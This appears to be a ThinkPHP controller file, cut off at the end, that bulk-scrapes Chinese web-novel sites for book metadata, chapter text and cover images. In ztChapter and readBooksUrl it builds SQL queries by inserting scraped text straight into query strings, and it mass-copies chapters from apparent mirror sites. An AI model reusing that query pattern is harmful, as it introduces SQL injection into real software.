<?php
/**
 * Created by PhpStorm.
 * User: end
 * Date: 2018/5/20
 * Time: 17:06
 */

namespace app\books\controller;


use think\Controller;
use think\Model;
use think\Request;
use think\Db;
use think\view;
use QL\QueryList;
use think\loader;
use think\Cache;
use think\Debug;
use think\Image;

class Curl extends Controller
{

    public function _initialize()
    {
        //开启即时显示输出
        ob_end_clean();
        ob_implicit_flush(1);

        //循环太久，会内存用尽，默认是128M
        ini_set('memory_limit','1024M');

        //设置永不超时
        set_time_limit (0);

        //开始时间
        Debug::remark('begin');
    }

    public function index(){

        set_time_limit(0);

        header('Content-Type: text/html; charset=utf-8');
        //引入curl方法
        $curl = model('Curl');
        $url = "https://www.bqg5.cc/quanbuxiaoshuo/";



        $data = $this->readUrl('bqg5.json');
        if((empty($data))){
            $data = $curl->getDataHttps($url);
            $data =  mb_convert_encoding($data, 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
            $pattern = '/<a href="[^"]*"[^>]*>(.*)<\/a>/';    // 这是匹配的正则表达式
            preg_match_all($pattern, $data, $matches);    //  开始匹配，该函数会把匹配结果放入 $matches数组中

            //拿出《a》标签中的链接和标签内容
            for($i=0;$i<count($matches[0]);$i++){

                $arr[] = $this->match_links($matches[0][$i],'https://www.bqg5.cc');
            }
            array_splice($arr,0,11);
            $this->write($arr);
            $data = $arr;
        }



        foreach ($data as $val){

            $res[] = ['books_name'=>$val['content'],'books_url'=>$val['link']];

        }

        Db::name('cou')->insertAll($res);

        echo "小说存储成功";

    }

    /**
     * 小说具体信息
     * @param int $books_id
     * @param string $books_url
     * @throws \think\Exception
     * @throws \think\exception\PDOException
     * @Author END
     */
    public function bqBooksInfo($again=0){

        if($again=='0'){
            //开启即时显示输出
            ob_end_clean();
            ob_implicit_flush(1);
        }

        //循环太久，会内存用尽，默认是128M
        ini_set('memory_limit','1024M');

        //设置永不超时
        set_time_limit (0);

        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);


        Db::table('books_cou')->where('books_time','exp',' is NULL')->chunk(40, function($books) {

            echo '开始处理数据'."<br/>";
            echo '开始时间：'.date('Y-m-d H:i:s')."<br/>";
            $url= array();
            $arr_name=array();
            foreach ($books as $book) {
                $url[] = $book['books_url'];
            }

            //引入curl方法
            $curl = model('Curl');
            $all = $curl->getManyUrl($url);
            $result = array();
            foreach ($all as $val){

                if(empty($val)){
                    continue;
                }
                //取得小说信息
                $content = array(
                    'name'=>array('h1','text'),
                    'type'=>array('.con_top>a:eq(1)','text'),
                    'author'=>array('#info>p:eq(0)','text'),
                    'time'=>array('#info>p:eq(2)','text'),
                    'summary'=>array('#intro>p','text'),
                    'img' => array('#fmimg>img','src'),


                );

                //匹配出信息
                $info = QueryList::Query($val,$content)->data;
                if(!empty($info[0]['author'])){

                    //使用该函数对结果进行转码
                    $author = mb_convert_encoding($info[0]['author'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
                    $author = substr($author,15);

                    $summary = mb_convert_encoding($info[0]['summary'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');


                    $time = mb_convert_encoding($info[0]['time'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
                    $time = substr($time,15);

                    $url = $info[0]['img'];

                    $types = mb_convert_encoding($info[0]['type'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
                    $types = substr($types,0,6);
                    if($types=='修真'){
                        $types = '仙侠';
                    }elseif($types=='言情'){
                        $types = '都市';
                    }

                    $type_id =  Db::table('books_type')->where('type_name','like',"%{$types}%")->value('type_id');
                    $type_id = !empty($type_id) ? $type_id : '14';

                    //下载小说封面
//                    $path = ROOT_PATH. 'public/static/images/books_img/';
//                    $imgName = $curl->downloadImg($url,$path);

                    //$books_name =mb_convert_encoding($info[0]['name'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
                    $books_name = iconv("GBK", "UTF-8", $info[0]['name']) ;

                    $r = array_filter($books, function($t) use ($books_name) { return $t['books_name'] == $books_name; });
                    $bid = array_column($r,'books_id');
                    if(empty($bid[0])){
                       echo  iconv("GBK", "UTF-8", $info[0]['name']) ;
                       echo "<br/>";


                    }else{
                        //存入作者，更新时间，状态
                        $arr_name[]=$books_name;
                        $result[] = ['books_id'=>$bid[0],'books_author'=>$author,'books_synopsis'=>$summary,'books_time'=>$time,'books_img'=>'2d83ee169fd1941790f18dcb6ffb4d16.jpg','books_type'=>$type_id];
                    }




                }else{
                    continue;
                }



            }
            if(!empty($result)){
                $cou  = \model('Cou');
                $cou->updateAll($result);
                echo '数据处理完成!  《'.implode("》《",$arr_name)."》<br/>";
                echo '完成时间：'.date('Y-m-d H:i:s')."<br/><br/><br/>";

            }



        });

        $editdata =  DB::table('books_cou')->where('books_time','exp',' is NULL')->find();
        if(!empty($editdata)){
            $this->bqchapter(1);
        }
        echo '完成------';
    }


    //更新小说封面
    public function downloadImg(){

        //开启即时显示输出
        ob_end_clean();
        ob_implicit_flush(1);

        //循环太久，会内存用尽，默认是128M
        ini_set('memory_limit','1024M');

        //设置永不超时
        set_time_limit (0);

        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        Db::table('books_cou')->where('books_img','2d83ee169fd1941790f18dcb6ffb4d16.jpg')->chunk(40, function($books) {
            echo '开始下载封面'."<br/>";
            echo '开始时间：'.date('Y-m-d H:i:s')."<br/>";

            $result=array();
        foreach ($books as $val){

            $url = $val['books_url'];
            //引入curl方法
            $curl = model('Curl');
            $html = $curl->getDataHttps($url);

            $book_info = array(
                'image' => array('#fmimg>img','src'),
            );

            $data = QueryList::Query($html,$book_info)->data;

            if(!empty($data[0]['image'])){
                $path = ROOT_PATH. 'public/static/images/books_img/';
                $imgName = $curl->downloadImg($data[0]['image'],$path);


                $result[] =['books_id'=>$val['books_id'],'books_img'=>$imgName];
            }

        }
            if(!empty($result)){
                $cou  = \model('Cou');
                $cou->updateAll($result);
                echo '图片下载完成!'."<br/>";
                echo '完成时间：'.date('Y-m-d H:i:s')."<br/><br/><br/>";

            }


    });

        echo '全部完成';

    }

    public function newChapter(){


        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        Db::table('books_cou')->chunk(40, function($books) {
            echo '开始更新最新章节'."<br/>";
            echo '开始时间：'.date('Y-m-d H:i:s')."<br/>";

            $result=array();
            foreach ($books as $val) {

                $wirth = Db::table('books_chapter')->where('books_id',$val['books_id'])->value('chapter_id');
                if(!empty($wirth)){
                    continue;
                }

                $url = $val['books_url'];
                //引入curl方法
                $curl = model('Curl');
                $html = $curl->getDataHttps($url);
                if(empty($html)){
                    continue;
                }
                /*取得小说地址*/
                $chapter_all = array(
                    'text' => array('dd>a', 'text'),
                    'href' => array('dd>a', 'href'),
                );
                //匹配出所有章节
                $match = QueryList::Query($html, $chapter_all)->data;

                if(empty($match)){
                    continue;
                }

                $match = array_reverse($match);
                $chapter_name = mb_convert_encoding($match[0]['text'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
                $chapter_url  ='https://www.bqg5.cc'.$match[0]['href'];



                $chapter_content = $curl->getDataHttps($chapter_url);
                if(empty($chapter_content)){
                    continue;
                }
                /*取得小说地址*/
                $content = array(
                    'content' => array('#content', 'text'),
                );
                //匹配出所有章节
                $text = QueryList::Query($chapter_content, $content)->data;
                if(empty($text)){
                    continue;
                }
                $chapter_text = mb_convert_encoding($text[0]['content'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');

                Db::table('books_chapter')->where('books_id',$val['books_id'])->delete();
                 $res[] = ['books_id'=>$val['books_id'],'chapter_name'=>$chapter_name,'chapter_url'=>$chapter_url,'chapter_content'=>$chapter_text];

            }

            if(!empty($res)){
                Db::name('chapter')->insertAll($res);
                echo '最新章节爬取成功!'."<br/>";
                echo '完成时间：'.date('Y-m-d H:i:s')."<br/><br/><br/>";
            }


        });

        echo '全部完成';



    }




















    //取得全部小说
    public function getData(){
        set_time_limit (0);
        header('Content-Type: text/html; charset=utf-8');
        //引入curl方法
        $curl = model('Curl');
        $url = "https://www.bqg5.cc/quanbuxiaoshuo/";
        $data = $curl->getDataHttps($url);
        $str =  mb_convert_encoding($data, 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');

        //拿出网页中所有《a》标签放到数组
        $reg1="/<a .*?>.*?<\/a>/";
        preg_match_all($reg1,$str,$aarray);


        //拿出《a》标签中的链接和标签内容
        for($i=0;$i<count($aarray[0]);$i++){

            $arr[] = $this->match_links($aarray[0][$i],'https://www.bqg5.cc');
        }
        array_splice($arr,0,11);

        //程序运行时间
        $starttime = explode(' ',microtime());

        foreach ($arr as $val){

            $data = ['books_name'=>$val['content'],'books_url'=>$val['link']];
            $books_id = Db::table('books_cou')->insertGetId($data);

            //本想取得书名后一起取章节，但无奈curl时间过长一直报错
            //$this->chapter($books_id,$val['link']);

        }

        //程序运行时间
        $endtime = explode(' ',microtime());
        $thistime = $endtime[0]+$endtime[1]-($starttime[0]+$starttime[1]);
        $thistime = round($thistime,3);
        echo "本网页执行耗时：".$thistime." 秒。".time();

    }

    /**
     * 小说章节和小说具体作息更新
     * @param int $books_id
     * @param string $books_url
     * @throws \think\Exception
     * @throws \think\exception\PDOException
     * @Author END
     */
    public function chapter(){
        set_time_limit (0);
        $all = Db::table('books_cou')->select();
        header('Content-Type: text/html; charset=utf-8');
        foreach ($all as $aval){

            //引入curl方法
            $curl = model('Curl');
            $url = $aval['books_url'];
            $res = $curl->getDataHttps($url);

            //取得小说内容
            //第三方类库
            Loader::import('QueryList', EXTEND_PATH);

            //取得小说信息
            $content = array(
                'author'=>array('#info>p:eq(0)','text'),
                'time'=>array('#info>p:eq(2)','text'),
                'summary'=>array('#intro>p','text'),
                'img' => array('#fmimg>img','src'),
            );
            //匹配出信息
            $info = QueryList::Query($res,$content)->data;
            foreach ($info as $ival){
                //使用该函数对结果进行转码
                $author = mb_convert_encoding($ival['author'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
                $author = substr($author,15);

                $summary = mb_convert_encoding($ival['summary'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');


                $time = mb_convert_encoding($ival['time'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
                $time = substr($time,15);

                $url = $ival['img'];
            }



            //取得小说类型
            $type = array(
                'type'=>array('.con_top>a','text'),
            );
            $type_name = QueryList::Query($res,$type)->data;
            $types = mb_convert_encoding($type_name[1]['type'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
            $types = substr($types,0,6);
            if($types=='修真'){
                $types = '仙侠';
            }elseif($types=='言情'){
                $types = '都市';
            }

            $type_id =  Db::table('books_type')->where('type_name','like',"%{$types}%")->value('type_id');
            $type_id = !empty($type_id) ? $type_id : '14';


            //下载小说封面
            $path = ROOT_PATH. 'public/static/images/books_img/';
            $imgName = $curl->downloadImg($url,$path);

            //存入作者，更新时间，状态
            $data = ['books_author'=>$author,'books_synopsis'=>$summary,'books_time'=>$time,'books_img'=>$imgName,'books_type'=>$type_id];
            Db::table('books_cou')->where('books_id', $aval['books_id'])->update($data);




            /*取得小说地址*/
            $chapter_all = array(
                'text'=>array('dd>a','text'),
                'href'=>array('dd>a','href'),
            );
            //匹配出所有章节
            $match = QueryList::Query($res,$chapter_all)->data;

            //去除前面重复的几个最新章节
            array_splice($match,0,9);

            foreach ($match as $key=>$val){
                //使用该函数对结果进行转码
                $match[$key]['text'] = mb_convert_encoding($val['text'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
                $match[$key]['href'] = 'https://www.bqg5.cc'.$val['href'];

            }

            foreach ($match as $mh){
                $data = ['books_id' =>$aval['books_id'],'chapter_name' => $mh['text'],'chapter_url' => $mh['href']];
                Db::table('books_chapter')->insert($data);

            }
            sleep(3);
            flush();
        }



    }


    /**
     * 小说章节和小说具体作息更新------暂不使用
     * @param int $books_id
     * @param string $books_url
     * @throws \think\Exception
     * @throws \think\exception\PDOException
     * @Author END
     */
    public function chapter2($books_id=0,$books_url=''){

        header('Content-Type: text/html; charset=GBK');
        //引入curl方法
        $curl = model('Curl');
        $url = $books_url;
        $res = $curl->getDataHttps($url);

        //取得小说内容
        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        //取得小说信息
        $content = array(
            'author'=>array('#info>p:eq(0)','text'),
            'time'=>array('#info>p:eq(2)','text'),
            'summary'=>array('#intro>p','text'),
            'img' => array('#fmimg>img','src'),
        );
        //匹配出信息
        $info = QueryList::Query($res,$content)->data;
        foreach ($info as $ival){
            //使用该函数对结果进行转码
            $author = mb_convert_encoding($ival['author'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
            $author = substr($author,15);

            $summary = mb_convert_encoding($ival['summary'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');


            $time = mb_convert_encoding($ival['time'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
            $time = substr($time,15);

            $url = $ival['img'];
        }



        //取得小说类型
        $type = array(
            'type'=>array('.con_top>a','text'),
        );
        $type_name = QueryList::Query($res,$type)->data;
        $types = mb_convert_encoding($type_name[1]['type'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
        $types = substr($types,0,6);
        if($types=='修真'){
            $types = '仙侠';
        }elseif($types=='言情'){
            $types = '都市';
        }

        $type_id =  Db::table('books_type')->where('type_name','like',"%{$types}%")->value('type_id');
        $type_id = !empty($type_id) ? $type_id : '14';


        //下载小说封面
        $path = ROOT_PATH. 'public/static/images/books_img/';
        $imgName = $curl->downloadImg($url,$path);

        //存入作者，更新时间，状态
        $data = ['books_author'=>$author,'books_synopsis'=>$summary,'books_time'=>$time,'books_img'=>$imgName,'books_type'=>$type_id];
        Db::table('books_cou')->where('books_id', $books_id)->update($data);




        /*取得小说地址*/
        $chapter_all = array(
            'text'=>array('dd>a','text'),
            'href'=>array('dd>a','href'),
        );
        //匹配出所有章节
        $match = QueryList::Query($res,$chapter_all)->data;

        //去除前面重复的几个最新章节
        array_splice($match,0,9);

        foreach ($match as $key=>$val){
            //使用该函数对结果进行转码
            $match[$key]['text'] = mb_convert_encoding($val['text'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
            $match[$key]['href'] = 'https://www.bqg5.cc'.$val['href'];

        }

        foreach ($match as $mh){
            $data = ['books_id' =>$books_id,'chapter_name' => $mh['text'],'chapter_url' => $mh['href']];
            Db::table('books_chapter')->insert($data);
        }


    }

    //取得小说作者，类型，封面
    public function booksInfo(){

        header('Content-Type: text/html; charset=GBK');
        //引入curl方法
        $curl = model('Curl');
        $url = 'https://www.bqg5.cc/16_16595/';
        $res = $curl->getDataHttps($url);


        //取得小说内容
        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        /*取得小说地址*/
        $content = array(
            'author'=>array('#info>p:eq(0)','text'),
            'time'=>array('#info>p:eq(2)','text'),
            'summary'=>array('#intro>p','text'),
            'img' => array('#fmimg>img','src'),
        );
        //匹配出信息
        $info = QueryList::Query($res,$content)->data;
        foreach ($info as $val){
            //使用该函数对结果进行转码
             $author = mb_convert_encoding($val['author'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
             $summary = mb_convert_encoding($val['summary'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
             $author = substr($author,15);
             $time = mb_convert_encoding($val['time'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
            $time = substr($time,15);

             $url = $val['img'];
        }

        //下载小说封面
        $path = ROOT_PATH. 'public/static/images/books_img/';
        $imgName = $curl->downloadImg($url,$path);

        //存入作者，更新时间，状态
        $data = ['books_author'=>$author,'books_synopsis'=>$summary,'books_time'=>$time,'books_img'=>$imgName];
        Db::table('books_cou')->where('books_id', 1)->update($data);

        halt($info);

    }





    //匹配a标签内容
    public function match_links($document,$url='') {
        preg_match_all("'<\s*a\s.*?href\s*=\s*([\"\'])?(?(1)(.*?)\\1|([^\s\>]+))[^>]*>?(.*?)</a>'isx",$document,$links);
        while(list($key,$val) = each($links[2])) {
            if(!empty($val))
                $match['link'] = $url.$val;
        }
        while(list($key,$val) = each($links[3])) {
            if(!empty($val))
                $match['link'] = $url.$val;
        }
        while(list($key,$val) = each($links[4])) {
            if(!empty($val))
                $match['content'] = $val;
        }

        return $match;
    }



    public function ztBooks(){

        //循环太久，会内存用尽，默认是128M
        ini_set('memory_limit','1024M');
        echo ini_get('memory_limit');
        die;

        set_time_limit (0);
        //引入curl方法
        $curl = model('Curl');

        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);


        for($i=1;$i<20;$i++){

            $url = 'https://www.zhetian.org/sort/all/'.$i.'.html';
            $html = $curl->geturldata($url);
            $book_info = array(
                'type' => array('.n>a:even','text'),
                'name' => array('.n>a>strong','text'),
                'link' => array('.n>a:odd','href'),
                // 采集所有a标签的文本内容
                'author' => array('.a>a','text'),
            );


            $data = QueryList::Query($html,$book_info)->data;
            foreach ($data as $key=>$val){

                $type = $this->bookType($val['type']);
                $url = 'https://www.zhetian.org/'.$val['link'];

                $restul = ['books_name'=>$val['name'],'books_author'=>$val['author'],'books_type'=>$type,'books_url'=>$url];
                $books_id = Db::table('books_cou')->insertGetId($restul);
                $this->ztChapter($books_id,$url);
            }
        }

        echo "完成";die;
    }

    public function ztChapter($books_id,$url){
        //引入curl方法
        $curl = model('Curl');

        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        $html = $curl->geturldata($url);
        $book_info = array(
            'chapter_name'=>array('.dirlist>li>a','text'),
            'chapter_url'=>array('.dirlist>li>a','href'),
        );

        $data = QueryList::Query($html,$book_info)->data;

        foreach ($data as $key=>$val){
            $url = 'https://www.zhetian.org/'.$val['chapter_url'];
            $sql = "INSERT INTO `books`.`books_chapter`(`books_id`, `chapter_name`, `chapter_url`) VALUES ('{$books_id}', '{$val['chapter_name']}', '{$url}')";
            Db::query($sql);
        }
    }


    public function bookType($type){
        $arrType = array('1'=>'玄幻','奇幻','武侠','仙侠','都市','历史','军事','游戏','竞技','科幻','灵异','同人','女生','其他');
        $data = array_search($type,$arrType);
        return !empty($data)?$data:'1';
    }


    //更新小说阅读地址
    public function readBooksUrl()
    {
        set_time_limit (0);
        header('Content-Type: text/html; charset=utf-8');
        //引入curl方法
        $curl = model('Curl');

        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        /*取得小说地址*/
        $data = $this->readUrl();

        if (!empty($data)) {
            //取出所有书
            $sql = "select `books_id`,`books_name` from books_cou";
            $books = Db::query($sql);


            foreach ($books as $bs) {

                $name = $bs['books_name'];
                //匹配出书籍地址
                $rb = array_filter($data, function ($t) use ($name) {
                    return $t['text'] == $name;
                });
                //key从0开始
                $rb = array_values ($rb);

                //如果为空表明未匹配到书籍
                if (!empty($rb)){
                    $url_all[] = $rb[0]['href'];
                    //读取小说章节目录
               /*     $ret = $curl->getUrlData($rb[0]['href']);
                    $book_chart = array(
                        'text' => array('#list>dl>dd>a', 'text'),
                        'href' => array('#list>dl>dd>a', 'href'),
                    );
                    $cha = QueryList::Query($ret, $book_chart)->data;



                    $chapter = Db::table("books_chapter")->where('books_id', '1')->select();

                       foreach ($chapter as $ch) {
                          $name = $ch['chapter_name'];
                            $r = array_filter($cha, function ($t) use ($name) {return $t['text'] == $name;});
                            if (!empty($r)) {
                                //key从0开始
                                $r = array_values ($r);

                                $url = "http://www.xbiquge.la/xiaoshuodaquan/";
                                $read_url = dirname($url) . $r[0]['href'];
                                $sql = "UPDATE `books`.`books_chapter` SET `read_url` = '" . $read_url . "' WHERE `chapter_id` = " . $ch['chapter_id'];

                                Db::query($sql);

                            }
                           }
                    */

                }

            }
            //并发处理
            $many=$curl->getManyUrl($url_all);

            $star_time = microtime();

             foreach ($many as $mk=>$mv){
                 $title = array(
                     'text'=>array('h1','text'),
                 );
                 $title_name = QueryList::Query($mv, $title)->data;
                if(empty($title_name)){
                    halt($mk);
                }

                 $books_data = Db::table('books_cou')->where('books_name',$title_name[0]['text'])->find();

                 //如果不为空，说明匹配得到书籍
                 if(!empty($books_data)){


                     $book_chart = array(
                         'text' => array('#list>dl>dd>a', 'text'),
                         'href' => array('#list>dl>dd>a', 'href'),
                     );
                     $cha = QueryList::Query($mv, $book_chart)->data;


                     $chapter = Db::table("books_chapter")->where('books_id', $books_data['books_id'])->select();

                     foreach ($chapter as $ch) {
                         $name = $ch['chapter_name'];
                         $r = array_filter($cha, function ($t) use ($name) {return $t['text'] == $name;});
                         if (!empty($r)) {
                             //key从0开始
                             $r = array_values ($r);

                             $url = "http://www.xbiquge.la/xiaoshuodaquan/";
                             $read_url = dirname($url) . $r[0]['href'];
                             $sql = "UPDATE `books`.`books_chapter` SET `read_url` = '" . $read_url . "' WHERE `chapter_id` = " . $ch['chapter_id'];
                             $arr[] = $sql;
                            // Db::query($sql);

                         }else{
                             $err[] = $ch['chapter_name'];
                         }
                     }
                     echo $title_name[0]['text'];
                     echo "<pre>";
                     print_r($err);
                     halt($arr);

                 }

             }



            $end_time = microtime();
            echo "耗时：".round($star_time-$end_time,3)."秒";

        } else {
            echo "无可用小说列表";
        }

    }

    /**
     * 更新小说
     *
     */
    public function ztBooksNew(){
        Debug::remark('begin');
        //循环太久，会内存用尽，默认是128M
        ini_set('memory_limit','1024M');


        set_time_limit (0);
        //引入curl方法
        $curl = model('Curl');

        //开启即时显示输出
        ob_end_clean();
        ob_implicit_flush(1);


        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);
    for($j=1;$j<17;$j++){
        $stari = $j*29-29>0?$j*29-29:1;
        $endi = $j*29;

        echo '当前正在处理第'.$j."批数据......<br/>";
        echo '开始时间：'.date('Y-m-d H:i:s')."<br/>";

        $url =array();

        for($i=$stari;$i<$endi;$i++){

            $url[] = 'https://www.zhetian.org/sort/all/'.$i.'.html';

        }

            $all = $curl->getManyUrl($url);
            if(in_array('',$all)){
               $all = $this->getAllUrl($url);
            }
            if(empty($all)){
                $this->getAllUrl($url);
                halt($all);
            }

            foreach ($all as $ak=>$av){

                $book_info = array(
                    'type' => array('.n>a:even','text'),
                    'name' => array('.n>a>strong','text'),
                    'link' => array('.n>a:odd','href'),
                    // 采集所有a标签的文本内容
                    'author' => array('.a>a','text'),
                );
                $data = QueryList::Query($av,$book_info)->data;

                if(!empty($data)){
                    $result = array();
                    foreach ($data as $key=>$val){

                        $type = $this->bookType($val['type']);
                        $url = 'https://www.zhetian.org/'.$val['link'];
                        $hasbooks = Db::table('books_cou')->where('books_name',$val['name'])->value('books_name');
                        if(!empty($hasbooks)){
                            continue;
                        }
                        $result[] = ['books_name'=>$val['name'],'books_author'=>$val['author'],'books_type'=>$type,'books_url'=>$url];

                    }
                    $result =  $this->array_unique_fb($result);
                    Db::table('books_cou')->insertAll($result);

                }


            }
        echo '第'.$j."批数据储存完毕......<br/>";
        echo '完成时间为'.date('Y-m-d H:i:s')."<br/><br/><br/>";

}

        Debug::remark('end');
        echo Debug::getRangeTime('begin','end').'s';

        //耗时：0.475秒
    }

    public function ztChapterNew(){

        //循环太久，会内存用尽，默认是128M
        ini_set('memory_limit','1024M');

        //设置永不超时
        set_time_limit (0);

        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);



        //开启即时显示输出
        Debug::remark('begin');

        Db::table('books_cou')->where('books_time','exp',' is NULL')->chunk(40, function($books) {
            $url= array();
            foreach ($books as $book) {
                $url[] = $book['books_url'];
            }

            //引入curl方法
            $curl = model('Curl');
            $all = $curl->getManyUrl($url);


          /*  if(in_array('',$all)){
                $all = $this->getAllUrl($url);
            } */



            $result=array();

            foreach ($all as $key=>$val){
                if(empty($val)){
                    continue;
                }

                $book_info = array(
                    'name' => array('h1','text'),
                    'status' => array('#author>i:last','text'),
                    'time' => array('#update>i:first','text'),
                    'synopsis' => array('#intro>p:first','text'),
                );

                //根据地址取得小说简介，小说状态，小说更新时间
                $data = QueryList::Query($val,$book_info)->data;
                //验证不为空
                $books_time = !empty($data[0]['time']) ? $data[0]['time'] : '';
                $synopsis = !empty($data[0]['synopsis']) ? trim(addslashes($data[0]['synopsis'])) : '';

                if(!empty($data[0]['status'])){
                    if($data[0]['status'] == '连载中'){
                        $status = '0';
                    }else{
                        $status = '1';
                    }
                }else{
                    $status = '';
                }
                $books_name = $data[0]['name'];
                $r = array_filter($books, function($t) use ($books_name) { return $t['books_name'] == $books_name; });
                $bid = array_column($r,'books_id');

                //下载小说封面
            /*    $book_img = array(
                    'image' => array('.novelinfo-r>img','src'),
                );

                $img = QueryList::Query($val,$book_img)->data;
                $path = ROOT_PATH. 'public/static/images/books_img/';
                $imgName = $curl->downloadImg($img[0]['image'],$path); */
                $imgName = '736d65f673cfd5014699c6c2e3d2b027.jpg';
                $result[] = ['books_id'=>$bid[0],'books_time'=>$books_time,'books_synopsis'=>$synopsis,'books_status'=>$status,'books_img'=>$imgName];

            }
            $cou  = \model('Cou');
            $cou->updateAll($result);

        });

        $editdata =  DB::table('books_cou')->where('books_time','exp',' is NULL')->find();
        if(!empty($editdata)){
            $this->ztChapterNew();
        }

        Debug::remark('end');
        echo Debug::getRangeTime('begin','end').'s';



    }




    /**
     * 更新小说章节
     * 由于取所有章节存数据库，占内存太大，故弃用
     */
    public function ztChapterNew_Disuse(){

        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        //开启即时显示输出
        ob_end_clean();
        ob_implicit_flush(1);
        Debug::remark('begin');

        Db::table('books_cou')->chunk(100, function($books) {
            foreach ($books as $book) {
                echo '当前正在处理第'.$book['books_id'].'本小说《'.$book['books_name']."》的章节数据......<br/>";
                echo '开始时间：'.date('Y-m-d H:i:s')."<br/>";
                //引入curl方法
                $curl = model('Curl');
                $html = $curl->geturldata($book['books_url']);
                $book_info = array(
                    'chapter_name'=>array('.dirlist>li>a','text'),
                    'chapter_url'=>array('.dirlist>li>a','href'),
                );

                $data = QueryList::Query($html,$book_info)->data;

                foreach ($data as $key=>$val){
                    $url = 'https://www.zhetian.org/'.$val['chapter_url'];
                    $restul[] = ['books_id'=>$book['books_id'],'chapter_name'=>$val['chapter_name'],'chapter_url'=>$url];

                    //Db::query($sql);
                }
                Db::table('books_chapter')->insertAll($restul);

                echo '小说《'.$book['books_name']."》章节数据储存完毕......<br/>";
                echo '完成时间为'.date('Y-m-d H:i:s')."<br/><br/><br/>";

            }


        });

        Debug::remark('end');
        echo Debug::getRangeTime('begin','end').'s';



    }

    //将数组写入json
    public function write($data){
        // 把PHP数组转成JSON字符串
        $json_string = json_encode($data);

        // 写入文件
        file_put_contents('bqg5.json', $json_string);
    }

    //读取网址
    public function readUrl($filename=''){
        // 从文件中读取数据到PHP变量
        $json_string = file_get_contents($filename);
        // 把JSON字符串转成PHP数组
        $data = json_decode($json_string, true);
        // 显示出来看看
        return $data;
    }


    /**
     * @param array $url 网址数组
     * @return mixed 当并发请求返回有空时，重新请求
     */
    public function getAllUrl($url=array()){
        $curl=\model('Curl');
        $all = $curl->getManyUrl($url);
        if(in_array('',$all)){
            $this->getAllUrl($url);
        }
        return $all;

    }

    /**
     * @param $arr
     * @return array
     * 数组去重
     */
    public  function array_unique_fb($arr){
        if(!empty($arr)){
            $res = array();
            foreach ($arr as $key=>$val){
                $res[$key] = $val['books_name'];
            }
            $res = array_unique($res);
            foreach ($res as $rk=>$rv){
                $data[] = $arr[$rk];
            }
        }else{
            $data = array();
        }


        return $data;
    }


    /**
     * 检测损坏图片
     */
    public function imgBase(){

        $dir = ROOT_PATH. 'public/static/images/books_img/';
        if (is_dir($dir)){
            if ($dh = opendir($dir)){
                while (($file = readdir($dh)) !== false){
                    $img = $dir.$file;
                    if(@getimagesize($img) != false ){
                        if( @imagecreatefromjpeg( $img ) == false ) {
                            $arr[] = $file;
                            //删除损坏图片
                            unlink($img);
                        }
                    }

                }
                closedir($dh);
            }
        }
        $arr = implode(",",$arr);
        halt($arr);
        //更新为暂无图片
       echo  Db::table('books_cou')->fetchSql()->where('books_img','in',$arr)->update(['books_img' => '759s.jpg']);

    }

    public function downloadBooks(){

        $url = 'https://www.xxbiquge.com/80_80292/';

        $curl = \model('Curl');
        $res = $curl->getDataHttps($url);
        //第三方类库
        Loader::import('QueryList', EXTEND_PATH);

        /*取得小说地址*/
        $chapter_all = array(
            'text'=>array('dd>a','text'),
            'href'=>array('dd>a','href'),
        );
        //匹配出所有章节
        $match = QueryList::Query($res,$chapter_all)->data;

        //去除前面重复的几个最新章节
       // array_splice($match,0,9);

        foreach ($match as $key=>$val){
            //使用该函数对结果进行转码
            $match[$key]['text'] = mb_convert_encoding($val['text'], 'UTF-8', 'UTF-8,GBK,GB2312,BIG5');
            $match[$key]['href'] = 'https://www.xxbiquge.com'.$val['href'];


        }
        $arr = array_chunk($match,60);
        $res = array();


        foreach ($arr as $key=>$val){
            $urls =array();
            foreach ($val as $av){
                $urls[] =  $av['href'];

            }
            $data = $curl->getManyUrl($urls);

            foreach ($data as $kd=>$kv){
            if(empty($kv)){
               continue;
            }
                $content = array(
                    'title' => array('h1','text'),
                    'dcontent' => array('#content','text'),
                );

                //根据地址取得小说简介，小说状态，小说更新时间
                $result = QueryList::Query($kv,$content)->data;
                $token = md5(time());
                $res[] = array('dtoken'=>$token,'dname'=>$result[0]['title'],'dcontent'=>$result[0]['dcontent']);
            }
        }



        Debug::remark('end');
        echo Debug::getRangeTime('begin','end').'s'."<br/>";
        halt($res);



    }

    /**
     * @param string $str 图片路径
     * @return string  生成一个封面图
     */
    public function addCover($str='无'){
        header('Content-Type: text/html; charset=utf-8');
        $dir = ROOT_PATH. 'public/static/images/cover.jpg';
        $image = Image::open($dir);
        $font = ROOT_PATH. 'public/static/fonts/fzfont.ttf';
       // $str='极道天魔';
        $name = chunk_split($str,3,"|");
        $num =uniqid().rand(1,999);
        $imgpath = ROOT_PATH.'public/static/images/books_img/'.$num.'_img.jpg';
